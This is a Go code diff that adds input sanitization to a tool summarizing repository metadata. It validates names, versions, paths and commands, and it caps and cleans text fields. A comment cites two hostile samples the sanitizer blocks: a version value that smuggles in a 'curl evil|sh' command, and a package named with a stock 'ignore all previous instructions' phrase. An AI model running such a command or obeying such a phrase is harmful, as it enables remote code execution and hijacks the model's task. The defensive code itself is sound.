@@ -206,6 +206,7 @@ func normalize(m *model.Repo) {
 	for i := range m.CI {
 		m.CI[i].Run = redact.String(m.CI[i].Run)
 	}
+	sanitize(m)
 	sort.SliceStable(m.Languages, func(i, j int) bool {
 		if m.Languages[i].Files != m.Languages[j].Files {
 			return m.Languages[i].Files > m.Languages[j].Files
@@ -349,4 +350,94 @@ var taskKinds = map[string]string{
 // if the name is not conventional (such tasks stay in the Task inventory only).
 func KindForTaskName(name string) string {
 	return taskKinds[strings.ToLower(name)]
+}
+
+// sanitize drops or blanks repository-derived values that fail validation, so
+// hostile strings (a version of "20 ; curl evil|sh", a package named
+// "IGNORE ALL PREVIOUS INSTRUCTIONS") never reach any output, JSON included.
+func sanitize(m *model.Repo) {
+	keep := m.Toolchains[:0]
+	for _, t := range m.Toolchains {
+		if model.ValidName(strings.ToLower(t.Name)) && model.ValidVersion(t.Version) && model.ValidPath(t.Source.Path) {
+			keep = append(keep, t)
+		}
+	}
+	m.Toolchains = keep
+
+	pms := m.PackageManagers[:0]
+	for _, pm := range m.PackageManagers {
+		if !model.ValidName(pm.Name) || !(pm.Dir == "." || model.ValidPath(pm.Dir)) {
+			continue
+		}
+		if pm.Version != "" && !model.ValidVersion(pm.Version) {
+			pm.Version = ""
+		}
+		pms = append(pms, pm)
+	}
+	m.PackageManagers = pms
+
+	projects := m.Projects[:0]
+	for _, p := range m.Projects {
+		if !(p.Dir == "." || model.ValidPath(p.Dir)) || !model.ValidPath(p.Manifest) {
+			continue
+		}
+		if p.Name != "" && !model.ValidPkg(p.Name) {
+			p.Name = ""
+		}
+		projects = append(projects, p)
+	}
+	m.Projects = projects
+
+	cmds := m.Commands[:0]
+	for _, c := range m.Commands {
+		if model.ValidCommand(c.Run) && (c.Dir == "." || model.ValidPath(c.Dir)) {
+			cmds = append(cmds, c)
+		}
+	}
+	m.Commands = cmds
+
+	tasks := m.Tasks[:0]
+	for _, t := range m.Tasks {
+		if !model.ValidPkg(t.Name) || !(t.Dir == "." || model.ValidPath(t.Dir)) || !model.ValidPath(t.Source.Path) {
+			continue
+		}
+		t.Body = capLine(t.Body, 200)
+		t.Desc = capLine(t.Desc, 120)
+		tasks = append(tasks, t)
+	}
+	m.Tasks = tasks
+
+	gen := m.Generated[:0]
+	for _, g := range m.Generated {
+		if model.ValidPattern(g.Pattern) {
+			gen = append(gen, g)
+		}
+	}
+	m.Generated = gen
+
+	ci := m.CI[:0]
+	for _, c := range m.CI {
+		if model.ValidPath(c.Source.Path) && (c.Dir == "" || c.Dir == "." || model.ValidPath(c.Dir)) {
+			c.Run = capLine(c.Run, 300)
+			ci = append(ci, c)
+		}
+	}
+	m.CI = ci
+	for i := range m.Notes {
+		m.Notes[i].Text = capLine(m.Notes[i].Text, 200)
+	}
+}
+
+// capLine removes control characters and caps s at n bytes.
+func capLine(s string, n int) string {
+	s = strings.Map(func(r rune) rune {
+		if r < 0x20 || r == 0x7f {
+			return ' '
+		}
+		return r
+	}, s)
+	if len(s) > n {
+		s = strings.ToValidUTF8(s[:n], "")
+	}
+	return s
 }
